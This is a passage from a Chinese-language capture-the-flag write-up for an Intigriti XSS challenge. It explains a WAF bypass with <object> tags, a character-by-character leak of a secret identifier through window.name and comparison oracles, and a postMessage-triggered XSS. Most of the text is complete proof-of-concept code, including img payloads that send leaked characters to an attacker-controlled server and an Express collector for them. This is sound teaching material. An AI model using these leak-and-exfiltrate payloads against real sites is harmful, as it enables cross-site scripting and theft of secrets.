r%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fs%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Ft%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fu%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fv%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fw%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fx%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fy%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2Fz%2F.source%3Cidentifier%26%26window.name%2B%2B%2Clocation.hash%2B%2F%7E%2F.source%3Cidentifier%26%26window.name%2B%2B&gt;&lt;/object&gt;#")
function getTopName() `{`
  let i = 0;
  for (; i &lt; 40; i++) `{`
    let res =  ( () =&gt; `{`
      let x;
      try `{`
        // shouldn't trigger new navigation
        x = xss.open('xss://xss', i);
        // this is for firefox
        if (x !== null) return 1;
        return;
      `}` catch (e) `{``}`
    `}`)();
    if (res) break;
  `}`
  return i;
`}`

keywords = "0123456789abcdefghijklmnopqrstuvwxyz~";

function get_char()`{`
    topName = getTopName();
    char = keywords[topName-1];
    console.log("get_top_window.name: "+ topName);
    console.log("this_char: "+ char)
`}`
setTimeout(get_char,100);
&lt;/script&gt;
&lt;/body&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t01d4a20c4c535f73bf.png)

结合前面可以通过`window.name`值的累加推算出`identifier`某位的字符，现在又可以通过外部页面获得`top.name`值。通过获得的`top.name`值找到对应的字符，保存在`location.hash`中，继续构造循环及比较下去，即可推算出`identifier`的所有值。为了构造这个循环，需要对重新不停的重新载入题目页面，完成每一次的`identifier`每一位的求解，这里对payload进行了改进，插入两个`&lt;object ...`，通过加载一个空的Blob实现:

```
&lt;object name=poc data=//attacker.com/poc.html&gt;&lt;/object&gt;
&lt;object name=xss src=//attacker.com/xss.html onload=XSS&gt;&lt;/object&gt;

top.xss.location = URL.createObjectURL(new Blob([], `{` type: 'text/html'`}`));
```

[![](https://p1.ssl.qhimg.com/t01e781250e568bcee7.png)](https://p1.ssl.qhimg.com/t01e781250e568bcee7.png)

当成功泄露出`identifier`值后，即可构造`postMessage`消息，实现xss



## POC

综上，将所有的思路联合起来就能突破题目的各种限制：<br>
1.`&lt;object`绕过waf<br>
2.泄露`identifier`随机值<br>
3.构造`postMessage` 消息，触发xss

完整的POC如下：

```
&lt;html&gt;
&lt;body&gt;
    &lt;span&gt;Leaked identifier: &lt;code id=leakedIdentifier&gt;&lt;/code&gt;&lt;/span&gt;
    &lt;iframe sandbox="allow-scripts allow-top-navigation allow-same-origin" name="xss"&gt;&lt;/iframe&gt;
&lt;script&gt;
    const keywords = "0123456789abcdefghijklmnopqrstuvwxyz~"
    const payload = keywords.split('').map(c =&gt;       `location.hash+/$`{`c`}`/.source&lt;/##/.source+identifier&amp;&amp;++top.name`
    ).join(',')
    const thisUrl = location.href.replace('http://', 'https://');
    const top_url = 'https://challenge-0421.intigriti.io/?error=' + encodeURIComponent(
        `&lt;object style=width:100% name=x data=$`{`thisUrl`}`&gt;&lt;/object&gt;&lt;object data=` +
        `//$`{`location.host`}`/empty.html name=lload onload=$`{`payload`}`&gt;&lt;/object&gt;`
    );

     if (top === window) `{`
        let startxss = confirm("Start XSS?");
        if(!startxss) throw /stopped/;
        name = 0;
        location = top_url + '##'
        throw /stop/
     `}`

    let lastValue = 0;
    let identifier = '';
    let stop = false;

    async function getTopName() `{`
        let i = 0;
        // it's just magic. tl;dr chrome and firefox work differently 
        // but this polyglot works for both;
        for (; i &lt; keywords.length + 1; i++) `{`
            let res = await (async () =&gt; `{`
                let x;
                try `{`
                    // shouldn't trigger new navigation
                    x = xss.open('xxxx://no-trigger', i + lastValue);
                    // this is for firefox
                    if (x !== null) return 1;
                    return;
                `}` catch (e) `{``}`
            `}`)();
            if (res) break;
        `}`
        return i + lastValue;
    `}`

    async function watchForNameChange() `{`
        let topName = await getTopName();
        if (topName !== lastValue) `{`
            const newTopName = topName - lastValue;
            lastValue = topName;
            get_char(newTopName - 1);
        `}` else `{`
            setTimeout(watchForNameChange, 60);
        `}`
    `}`

    function oracleLoaded() `{`
        watchForNameChange();
    `}`

    function log(identifier) `{`
        leakedIdentifier.innerHTML = identifier;
        console.log(identifier);
    `}`

    function get_char(d) `{`
        let c = keywords[d]
        if (c === '~') `{`
            identifier = identifier.slice(0, -1) + keywords[keywords.search(identifier.slice(-1)) + 1];
            log(identifier);
            expxss(identifier);
            return;
        `}`
        identifier += c;
        log(identifier);
        top.location = top_url + '##' + identifier;
        top.lload.location = URL.createObjectURL(new Blob([
            '&lt;script&gt;onload=top.x.oracleLoaded&lt;\/script&gt;'
        ], `{`
            type: 'text/html'
        `}`));
    `}`

    function expxss(identifier) `{`
        stop = true;
        top.postMessage(`{`
            type: 'waf',
            identifier,
            str: `&lt;img src=x onerror=alert("flag`{`THIS_IS_THE_FLAG`}`")&gt;`,
            safe: true
        `}`, '*')

    `}`
    onload = () =&gt; `{`
        setTimeout(watchForNameChange, 60);
    `}`
&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011696ca1cf6e2548a.png)

[![](https://p0.ssl.qhimg.com/t01dc43430121959fb5.png)](https://p0.ssl.qhimg.com/t01dc43430121959fb5.png)

成功实现xss，通过挑战！

这里再对hits进行一个解释：

> <p>（4.19）First hint: find the objective!【 提示`&lt;object&gt;`】<br>
（4.20）Time for another hint! Where to smuggle data?【提示`object data`以及后面可以利用的`locatino.hash`】<br>
（4.20）Time for another tip! One bite after another!【提示需要一位一位的泄露`identifier`】<br>
（4.20）Here’s an extra tip: ++ is also an assignment 【提示可以利用++巧妙的跨站测算出`identifier`】<br>
（4.22）Let’s give another hint:”Behind a Greater Oracle there stands one great Identity” (leak it) 【提示构造比较的方式泄露`identifier`】<br>
（4.23）Tipping time! Goal &lt; object(ive) 【提示利用`&lt;object`标签，采用`identifier&lt;"str"`的方式构造比较】<br>
（4.24）Another hint: you might need to unload a custom loop! 【提示构造循环】</p>

最后，再放一些利用其他方式的POC。<br>
利用`&lt;img&gt;`:

```
var payload = `
&lt;img srcset=//my_server/0 id=n0 alt=#&gt;
&lt;img srcset=//my_server/1 id=n1 alt=a&gt;
&lt;img srcset=//my_server/2 id=n2 alt=b&gt;
&lt;img srcset=//my_server/3 id=n3 alt=c&gt;
&lt;img srcset=//my_server/4 id=n4 alt=d&gt;
&lt;img srcset=//my_server/5 id=n5 alt=e&gt;
&lt;img srcset=//my_server/6 id=n6 alt=f&gt;
&lt;img srcset=//my_server/7 id=n7 alt=g&gt;
&lt;img srcset=//my_server/8 id=n8 alt=h&gt;
&lt;img srcset=//my_server/9 id=n9 alt=i&gt;
&lt;img srcset=//my_server/a id=n10 alt=j&gt;
&lt;img srcset=//my_server/b id=n11 alt=k&gt;
&lt;img srcset=//my_server/c id=n12 alt=l&gt;
&lt;img srcset=//my_server/d id=n13 alt=m&gt;
&lt;img srcset=//my_server/e id=n14 alt=n&gt;
&lt;img srcset=//my_server/f id=n15 alt=o&gt;
&lt;img srcset=//my_server/g id=n16 alt=p&gt;
&lt;img srcset=//my_server/h id=n17 alt=q&gt;
&lt;img srcset=//my_server/i id=n18 alt=r&gt;
&lt;img srcset=//my_server/j id=n19 alt=s&gt;
&lt;img srcset=//my_server/k id=n20 alt=t&gt;
&lt;img srcset=//my_server/l id=n21 alt=u&gt;
&lt;img srcset=//my_server/m id=n22 alt=v&gt;
&lt;img srcset=//my_server/n id=n23 alt=w&gt;
&lt;img srcset=//my_server/o id=n24 alt=x&gt;
&lt;img srcset=//my_server/p id=n25 alt=y&gt;
&lt;img srcset=//my_server/q id=n26 alt=z&gt;
&lt;img srcset=//my_server/r id=n27 alt=0&gt;
&lt;img srcset=//my_server/s id=n28&gt;
&lt;img srcset=//my_server/t id=n29&gt;
&lt;img srcset=//my_server/u id=n30&gt;
&lt;img srcset=//my_server/v id=n31&gt;
&lt;img srcset=//my_server/w id=n32&gt;
&lt;img srcset=//my_server/x id=n33&gt;
&lt;img srcset=//my_server/y id=n34&gt;
&lt;img srcset=//my_server/z id=n35&gt;

&lt;img id=lo srcset=//my_server/loop onerror=
n0.alt+identifier&lt;location.hash+1?n0.src+++lo.src++:
n0.alt+identifier&lt;location.hash+2?n1.src+++lo.src++:
n0.alt+identifier&lt;location.hash+3?n2.src+++lo.src++:
n0.alt+identifier&lt;location.hash+4?n3.src+++lo.src++:
n0.alt+identifier&lt;location.hash+5?n4.src+++lo.src++:
n0.alt+identifier&lt;location.hash+6?n5.src+++lo.src++:
n0.alt+identifier&lt;location.hash+7?n6.src+++lo.src++:
n0.alt+identifier&lt;location.hash+8?n7.src+++lo.src++:
n0.alt+identifier&lt;location.hash+9?n8.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n1.alt?n9.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n2.alt?n10.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n3.alt?n11.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n4.alt?n12.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n5.alt?n13.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n6.alt?n14.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n7.alt?n15.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n8.alt?n16.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n9.alt?n17.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n10.alt?n18.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n11.alt?n19.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n12.alt?n20.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n13.alt?n21.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n14.alt?n22.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n15.alt?n23.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n16.alt?n24.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n17.alt?n25.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n18.alt?n26.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n19.alt?n27.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n20.alt?n28.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n21.alt?n29.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n22.alt?n30.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n23.alt?n31.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n24.alt?n32.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n25.alt?n33.src+++lo.src++:
n0.alt+identifier&lt;location.hash+n26.alt?n34.src+++lo.src++:
n35.src+++lo.src++&gt;`
```

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;meta charset="UTF-8"&gt;
  &lt;/head&gt;
  &lt;body&gt;  
  &lt;/body&gt;
  &lt;script&gt;
    var payload = // see above
    payload = encodeURIComponent(payload)

    var baseUrl = 'https://my_server'

    // reset first
    fetch(baseUrl + '/reset').then(() =&gt; `{`
      start()
    `}`)

    async function start() `{`
      // assume identifier start with 1
      console.log('POC started')
      if (window.xssWindow) `{`
        window.xssWindow.close()
      `}`

      window.xssWindow = window.open(`https://challenge-0421.intigriti.io/?error=$`{`payload`}`#1`, '_blank')

      polling()
    `}`

    function polling() `{`
      fetch(baseUrl + '/polling').then(res =&gt; res.text()).then((token) =&gt; `{`

        // guess fail, restart
        if (token === '1zz') `{`
          fetch(baseUrl + '/reset').then(() =&gt; `{`
            console.log('guess fail, restart')
            start()
          `}`)
          return
        `}`

        if (token.length &gt;= 10) `{`
          window.xssWindow.postMessage(`{`
            type: 'waf',
            identifier: token,
            str: '&lt;img src=xxx onerror=alert("flag`{`THIS_IS_THE_FLAG`}`")&gt;',
            safe: true
          `}`, '*')
        `}`

        window.xssWindow.location = `https://challenge-0421.intigriti.io/?error=$`{`payload`}`#$`{`token`}``

        // After POC finsihed, polling will timeout and got error message, I don't want to print the message
        if (token.length &gt; 20) `{`
          return
        `}`

        console.log('token:', token)
        polling()
      `}`)
    `}`
  &lt;/script&gt;
&lt;/html&gt;
```

```
var express = require('express')

const app = express()

app.use(express.static('public'));
app.use((req, res, next) =&gt; `{`
  res.set('Access-Control-Allow-Origin', '*');
  next()
`}`)

const handlerDelay = 100
const loopDelay = 550

var initialData = `{`
  count: 0,
  token: '1',
  canStartLoop: false,
  loopStarted: false,
  canSendBack: false
`}`
var data = `{`...initialData`}`

app.get('/reset', (req, res) =&gt; `{`
  data = `{`...initialData`}`
  console.log('======reset=====')
  res.end('reset ok')
`}`)

app.get('/polling', (req, res) =&gt; `{`
  function handle(req, res) `{`
    if (data.canSendBack) `{`
      data.canSendBack = false
      res.status(200)
      res.end(data.token)
      console.log('send back token:', data.token)

      if (data.token.length &lt; 14) `{`
        setTimeout(() =&gt; `{`
          data.canStartLoop = true
        `}`, loopDelay)
      `}`
    `}` else `{`
      setTimeout(() =&gt; `{`
        handle(req, res)
      `}`, handlerDelay)
    `}`
  `}`

  handle(req, res)
`}`)

app.get('/loop', (req, res) =&gt; `{`
  function handle(req, res) `{`
    if (data.canStartLoop) `{`
      data.canStartLoop = false
      res.status(500)
      res.end()
    `}` else `{`
      setTimeout(() =&gt; `{`
        handle(req, res)
      `}`, handlerDelay)
    `}`
  `}`

  handle(req, res)
`}`)

app.get('/:char', (req, res) =&gt; `{`
  // already start stealing identifier
  if (req.params.char.length &gt; 1) `{`
    res.end()
    return
  `}`
  console.log('char received', req.params.char)
  if (data.loopStarted) `{`
    data.token += req.params.char
    console.log('token:', data.token)
    data.canSendBack = true

    res.status(500)
    res.end()
    return 
  `}`

  // first round
  data.count++
  if (data.count === 36) `{`
    console.log('initial image loaded, start loop')
    data.count = 0
    data.loopStarted = true
    data.canStartLoop = true
  `}`
  res.status(500)
  res.end()
`}`)

app.listen(5555, () =&gt; `{`
  console.log('5555')
`}`)
```

另一个POC：

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;link rel="icon" href="data:;base64,iVBORw0KGgo=" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      let currentIdentifier = "1";

      function getIdentifier() `{`
        return currentIdentifier;
      `}`

      async function setIdentifier(identifier) `{`
        console.log("CHANGE GUESS CALLED", identifier);
        if (identifier == currentIdentifier) return;
        checkWindow.location = `http://localhost:3000/opener.html?not`;
        await waitUntilWriteable(checkWindow);

        checkWindow.name = "" + identifier;
        checkWindow.location = `https://challenge-0421.intigriti.io/style.css`;
        currentIdentifier = "" + identifier;
        await waitForLocationChange(
          checkWindow,
          `https://challenge-0421.intigriti.io/style.css`
        );
      `}`

      async function waitForLocationChange(windowReference, location) `{`
        return new Promise((resolve) =&gt; `{`
          const handle = setInterval(() =&gt; `{`
            try `{`
              if (windowReference.location.href.includes(location)) `{`
                clearInterval(handle);
                setTimeout(resolve, 100);
              `}`
            `}` catch (e) `{``}`
          `}`);
        `}`);
      `}`

      async function waitUntilWriteable(windowReference) `{`
        return new Promise((resolve) =&gt; `{`
          const handle = setInterval(() =&gt; `{`
            try `{`
              if (windowReference.name.length) `{`
                clearInterval(handle);
                setTimeout(resolve, 100);
              `}`
            `}` catch (e) `{``}`
          `}`);
        `}`);
      `}`

      (async () =&gt; `{`
        checkWindow = window.open(`http://localhost:3000/opener.html`, "1");
        await waitForLocationChange(
          checkWindow,
          `http://localhost:3000/opener.html`
        );
        checkWindow.location = `https://challenge-0421.intigriti.io/style.css`;
      `}`)();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;link rel="icon" href="data:;base64,iVBORw0KGgo=" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      if (location.search.includes("not") === false) `{`
        w = window.open(
          `https://challenge-0421.intigriti.io/?error=` +
            encodeURIComponent(
              `&lt;object id=poc data=http://localhost:3000/solver.html width=101 height=101&gt;&lt;/object&gt;
              &lt;video muted loop autoplay src=https://www.w3schools.com/jsref/mov_bbb.mp4 
                ontimeupdate=window.opener.name&lt;identifier?poc.height++:poc.width++&gt;`
            ),
          "_blank"
        );
      `}`
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```

```
&lt;!DOCTYPE html&gt;
&lt;html&gt;
  &lt;head&gt;
    &lt;link rel="icon" href="data:;base64,iVBORw0KGgo=" /&gt;
  &lt;/head&gt;
  &lt;body&gt;
    &lt;script&gt;
      let lastHeight = 101;
      let lastWidth = 101;
      const chars = "0123456789abcdefghijklmnopqrstuvwxyz`{`".split("");
      let solvedIdentifier = "";

      let checks = 0;
      let checksNeeded = 15;

      function trySolve() `{`
        try `{`
          window.parent.postMessage(
            `{`
              type: "waf",
              identifier: solvedIdentifier,
              safe: true,
              str: "&lt;img src=x onerror=alert('flag`{`THIS_IS_THE_FLAG`}`')&gt;",
            `}`,
            "*"
          );
        `}` catch (e) `{``}`
      `}`

      async function foundChar(char) `{`
        console.log("FOUND CHAR: ", char);
        solvedIdentifier = `$`{`solvedIdentifier`}`$`{`char`}``;
        console.log("TOTAL SOLVED", solvedIdentifier);
        await window.parent.opener.opener.setIdentifier(`$`{`solvedIdentifier`}`1`);

        if (solvedIdentifier.length &gt; 12) trySolve();
      `}`

      let locked = false;
      setInterval(async () =&gt; `{`
        const `{` innerHeight, innerWidth `}` = window;
        if (innerHeight === lastHeight &amp;&amp; innerWidth === lastWidth) `{`
          return;
        `}`
        checks++;
        if (checks &lt; checksNeeded || checks % checksNeeded !== 0) `{`
          return;
        `}`
        const currentIdentifier = window.parent.opener.opener.getIdentifier();

        if (solvedIdentifier.length &gt;= currentIdentifier.length) `{`
          return;
        `}`

        const currentChar = currentIdentifier.substr(-1);
        const targetedChar = chars[chars.indexOf(currentChar) - 1];
        if (!targetedChar) return;
        const nextChar = chars[chars.indexOf(currentChar) + 1];

        console.log("currentIdentifier:", currentIdentifier);
        console.log("currentChar:", currentChar);
        console.log("targetedChar:", targetedChar);
        console.log("nextChar:", nextChar);

        if (innerWidth &gt; lastWidth) `{`
          setTimeout(() =&gt; (locked = false), 1000);
          if (!locked) `{`
            locked = true;
            lastWidth = innerWidth + 100;
            await foundChar(targetedChar);
          `}`
          return;
        `}`

        if (innerHeight &gt; lastHeight) `{`
          locked = false;

          await window.parent.opener.opener.setIdentifier(
            `$`{`solvedIdentifier`}`$`{`nextChar`}``
          );
          lastWidth = innerWidth;
          lastHeight = innerHeight;
        `}`
      `}`, 100);
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;
```
